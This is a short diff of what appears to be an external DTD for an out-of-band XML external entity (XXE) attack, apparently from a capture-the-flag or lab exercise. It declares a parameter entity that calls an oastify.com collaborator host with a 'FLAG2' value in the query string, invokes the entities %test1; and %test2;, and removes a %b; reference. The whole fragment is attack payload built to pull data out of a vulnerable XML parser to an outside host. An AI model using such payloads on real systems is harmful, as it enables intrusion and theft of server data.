@@ -3,7 +3,6 @@
 <!ENTITY % test2 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG2;">
 
 %test1;
-%b;
 %test2;
 
 
